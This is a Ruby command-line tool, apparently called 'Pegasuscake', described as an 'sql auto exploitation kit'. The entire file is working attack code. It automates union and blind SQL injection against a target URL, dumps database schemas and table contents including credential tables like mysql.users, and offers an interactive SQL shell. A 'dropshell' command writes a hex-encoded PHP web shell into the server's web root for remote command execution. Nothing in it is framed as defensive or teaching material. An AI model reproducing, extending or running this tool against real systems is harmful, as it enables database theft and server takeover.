#!/usr/bin/ruby

# Pegasuscake
# written by Muhammad Sobri Maulana


require 'getoptlong'
require 'net/http'

print %q!

       _________________________________
      /                                 \
           sql auto exploitation kit
      \_________________________________/

             Pegasus Hacker


!


opts = GetoptLong.new(
  ["--help", "-h",     GetoptLong::NO_ARGUMENT],
  ["--uri", "-u",      GetoptLong::REQUIRED_ARGUMENT],
  ["--param", "-p",    GetoptLong::OPTIONAL_ARGUMENT],
  ["--error","-e",     GetoptLong::OPTIONAL_ARGUMENT],
  ["--delim", "-d",    GetoptLong::OPTIONAL_ARGUMENT],
  ["--file", "-f",     GetoptLong::NO_ARGUMENT],
  ["--blind", "-b",    GetoptLong::NO_ARGUMENT],
  ["--skipdump", "-x", GetoptLong::NO_ARGUMENT]
)

@params = Hash.new()

opts.each do |opt, arg|
  @params["#{opt}"] = arg
end


def get(uri)

  uri = URI(URI.encode(uri))
  res = Net::HTTP.get_response(uri)
  uri = res.body
  return uri
end


def get_data(uri, ident, query)
  
  target = uri.gsub(/\+(.+)?(#{ident})/,"+\\1" +
  "(SeLeCT+CoNcAt(0x3A,0x21,0x21,0x7B,0x7B,0x7B,(#{query})," +
  "0x7D,0x7D,0x7D,0x21,0x21,0x3A,0x0D,0x0A))")
  return get(target).scan(/:!!{{{(.*)}}}!!:/).uniq.join
end


def get_data_blind(uri, query)
  
  true_resp = get(uri + "+aNd+1=1" + @escape_str)
  
  i = 0
  
  while 1
    resp = get(uri + "+aNd+(SeLeCT+leNgTh((#{query}))=#{i})" + @escape_str)
    if (resp == true_resp)
      break
    else
      i += 1
    end
  end
  
  length = i + 1
  curpos = 1
  
  val = String.new()
  
  sql = "+aNd+(SeLeCT+aScii(suBstRiNg("
  
  while curpos < length
    
    resp = get(uri + sql + "(#{query}),#{curpos},1))<51)" + @escape_str)
    
    if(resp == true_resp)
      i_s = 0
      i_e = 51
    else
      resp = get(uri + sql + "(#{query}),#{curpos},1))<101)" + @escape_str)
      if(resp == true_resp)
        i_s = 50
        i_e = 101
      else
        resp = get(uri + sql + "(#{query}),#{curpos},1))<151)" + @escape_str)
        if(resp == true_resp)
          i_s = 100
          i_e = 151
        else
          resp = get(uri + sql + "(#{query}),#{curpos},1))<201)" + @escape_str)
          if(resp == true_resp)
            i_s = 150
            i_e = 201
          else
            i_s = 200
            i_e = 255
          end
        end
      end
    end
    
    while(i_s < i_e)
      resp = get(uri + sql + "(#{query}),#{curpos},1))=#{i_s})" + @escape_str)
      if (resp == true_resp)
        print i_s.chr
        val += i_s.chr
        curpos += 1
        break
      else
        i_s += 1
      end
    end
  end
  puts "\n"
  return val
end


def hex_str(str)
  
  chars = str.split(/ */)
  hex_val = "0x"
  chars.each do |c|
    hex_val += c.ord.to_s(16)
  end
  
  return hex_val
end


def dump_columns(uri, ident, table)
  
  i = 0
  
  if table.match(/\./)
    schema = hex_str(table.scan(/^(.*)\./).join)
    table  = hex_str(table.scan(/\.(.*)$/).join)
    while 1
      if (@bm == 1)
        res = get_data_blind(uri, "SeLeCT+CoNcAt(table_schema,0x2E,table_name,0x2E,column_name)" + 
        "FrOm+information_schema.columns+WhErE+table_schema+=+#{schema}+aNd+" +
        "table_name+=+#{table}+LiMiT+#{i},1")
      else
        res = get_data(uri, ident, "SeLeCT+CoNcAt(table_schema,0x2E,table_name,0x2E,column_name)" + 
        "FrOm+information_schema.columns+WhErE+table_schema+=+#{schema}+aNd+" +
        "table_name+=+#{table}+LiMiT+#{i},1")
      end
      if res.length > 1
        @columns << res
        puts res
        write_logfile(res + "\n") if @lfname
        i += 1
      else
        break
      end
    end
  else
    table = hex_str(table)
    while 1
      if (@bm == 1)
        res = get_data_blind(uri, "SeLeCT+CoNcAt(table_schema,0x2E,table_name,0x2E,column_name)" +
        "FrOm+information_schema.columns+WhErE+table_name+=+#{table}+LiMiT+#{i},1")
      else
        res = get_data(uri, ident, "SeLeCT+CoNcAt(table_schema,0x2E,table_name,0x2E,column_name)" +
        "FrOm+information_schema.columns+WhErE+table_name+=+#{table}+LiMiT+#{i},1")
      end
      if res.length > 1
        @columns << res
        puts res
        write_logfile(res + "\n") if @lfname
        i += 1
      else
        break
      end
    end
  end
end


def dump_information_schema(uri, ident)
  
  i = 0
    
  while 1
    if (@bm == 1)
      res = get_data_blind(uri, "SeLeCT+CoNcAt(table_schema,0x2E,table_name)" + 
      "FrOm+information_schema.tables+WhErE+table_schema+!=+" +
      hex_str("information_schema") + 
      "+LIMIT+#{i},1") 
    else
      res = get_data(uri, ident, "SeLeCT+CoNcAt(table_schema,0x2E,table_name)" + 
      "FrOm+information_schema.tables+WhErE+table_schema+!=+" +
      hex_str("information_schema") + 
      "+LIMIT+#{i},1")
    end
    if res.length > 1
      @tables << res
      puts res if (@bm < 1)
      write_logfile(res + "\n") if @lfname
      i += 1
    else
      break
    end
  end  
end


def dump_data(uri, ident, table)
  
  dfields = []
  
  i = 0
  
  @columns.each do |c|
    if c.match(/#{table}\.(.*)$/)
      dfields << $1
      i += 1
    end
  end
  
  if (i > 0)
  
    puts dfields.join(":")
    write_logfile(dfields.join(":") + "\n\n") if @lfname
    print "\n\n"
    
    i = 0
    
    while 1
      if (@bm == 1)
        res = get_data_blind(uri, "SeLeCT+CoNcAt(" + dfields.join(",0x3A,") + 
        ")+FrOm+#{table}+LiMiT+#{i},1")
      else
        res = get_data(uri, ident, "SeLeCT+CoNcAt(" + dfields.join(",0x3A,") + 
        ")+FrOm+#{table}+LiMiT+#{i},1")
      end
      if res.length > 1
        @columns << res
        puts res
        write_logfile(res + "\n") if @lfname
        i += 1
      else
        break
      end
    end
  end
end


def drop_php_shell(uri, ident, path)
  
  target = uri.gsub(/\+(.+)?(#{ident})/,"+\\1" +
  "(SeLeCT+0x3C3F706870207072696E7420223C7072" +
  "653E223B73797374656D28245F4745545B2778275D" +
  "293B3F3E3C212D2D)")
  
  target += "+INTO+OUTFILE+'#{path}'"
  
  get(target) 
end


def get_ident(uri, ident)
  
  i = 0
  ident = ident.to_i
  while i < ident
    target = uri.gsub(/\+(.+)?(#{i})/,"+\\1CoNcAt" + 
    "(0x3A,0x21,0x21,0x21,0x3A,0x7B,0x21,0x7D,0x3A,0x21,0x21,0x21,0x3A)")
    if get(target).match(/:!!!:{!}:!!!:/)
      return i.to_s
      break
    end
    i += 1
  end
end


def run_sql_shell(uri, ident)
  
  while 1
    print "mysql> "
    cmd = STDIN.gets.chop
    break if cmd == "quit"
    if cmd.match(/^hex:(.*)/)
      puts hex_str($1)
    elsif cmd.match(/^dropshell:(.*)/)
      drop_php_shell(uri, ident, $1)
    elsif cmd.match(/^blind:(.*)/)
      if($1 == "on")
        @bm = 1
        puts "Blind mode is ON!"
      else
        @bm = 0
        puts "Blind mode is OFF!"
      end
    elsif cmd.match(/^dump:(.*)/)
      if (@tables.length > 0)
        dump_columns(uri, ident, $1)
        dump_data(uri, ident, $1)
      else
        puts "No database structure available!"
      end
    else  
      if (@bm == 1)
        get_data_blind(@default_uri, cmd)
      else
        puts get_data(uri, ident, cmd)
      end
    end  
  end
end


def move_param(uri, param)
  
  val = uri.scan(/((&)|(\?))(#{param}=.[0-9a-zA-Z.,:;\/\\-_+{}\[\]*%~!?|<>^=]*)/).join.gsub("&&","").gsub("??","")

  if uri.match(/#{val}$/)
    return uri
  else
    uri = uri.gsub(/#{val}(&)?/, "") + "&#{val}"
    return uri
  end
end


def exploit_sql(uri)
  
  if(!uri.match(/^http(s)?:\/\//))
    uri = "http://" + uri
  end
  
  if(@params["--param"])
    uri = move_param(uri, @params["--param"])
  end
  
  @default_uri = uri

  err   =  @error_resp
  esc   =  @escape_str
  uri  +=  "+UnIOn+SeLeCT+"                                                       
  val   =  "1"
  res   =  err
  
  puts "[*] Writing data to #{@lfname}" if (@lfname)
  
  if (@bm != 1)
    print "[*] Getting column count..."
    
    while (res.match(err))
        val += "\x2C" + (val.match(/\d\d?\d?$/)[0].to_i.next).to_s
        res = get(uri + val + esc)    
    end
    
    uri += val
    print "\n"
    puts  "[*] Target URI: " + @default_uri
    print "[*] Searching identifier..."
    ident = get_ident(uri, val.match(/(\d*)$/)[0].to_s)
    print "\n"
    
    if (ident == nil)
      puts "[*] Can't find identifier (#{err})"
      puts "[*] Using blind SQL injection mode\n\n"
      @bm = 1
    end
    
    puts "[*] Using identifier: " + ident + "\n\n" if (ident != nil)
  else
    puts "[*] Using blind SQL Injection mode\n\n"
  end
  
  
  if(@skip_db_dump < 1)
    
    puts "[*] Dumping tables...\n\n"
    
    if (@bm == 1)
      dump_information_schema(@default_uri, 0)
    else
      dump_information_schema(uri, ident)
    end

  end

  run_sql_shell(uri, ident)
end


def create_logfile()

  @lfname = "sqlcake_" + Time.now.strftime("%Y-%m-%d-%H%M%S") + ".txt"
  
  File.open(@lfname, "w") do |f|
    f.print "SQL AXP started at #{Time.now}\n\n"
  end
end


def write_logfile(data)

  if(@lfname)
    File.open(@lfname, "a") do |f|
      f.print data
    end
  end
end


def help()

print %q!pegasuscake
written by Muhammad Sobri Maulana
 
Pegasus Hacker

hex:[str]       => to hex a string for magic quotes bypassing, e.g. hex:hello
dropshell:[str] => drops a php shell (param x) (magic quotes must be deactivated), 
                => e.g. dropshell:/var/www/exec.php | /exec.php?x=ps
dump:[str]      => to dump a specific table, e.g. dump:mysql.users
blind:[on/off]  => toggle blind sql injection mode

parameter setup:
 
-u => set target URI ["http://www.example.com/x.php?id=2&cat=5"]
-p => set target parameter ["id"]
-e => set error string for union selecion ["_fetch"]
-d => set error escape string [" /*"]
-b => use blind sql injection mode
-f => write data to output file
-x => skip database dump 

!

exit 0
end

@skip_db_dump = 0
@bm = 0

@error_resp = @params["--error"] || "_assoc"
@escape_str = @params["--delim"] || "\x20\x2D\x2D"

@tables  = []
@columns = []

if (!@params["--uri"])
  help()
end

if (@params["--help"])
  help()
end

if (@params["--file"])
  create_logfile()
end

if (@params["--blind"])
  @bm = 1
end

if (@params["--skipdump"])
  @skip_db_dump = 1 
end

exploit_sql(@params["--uri"]) 
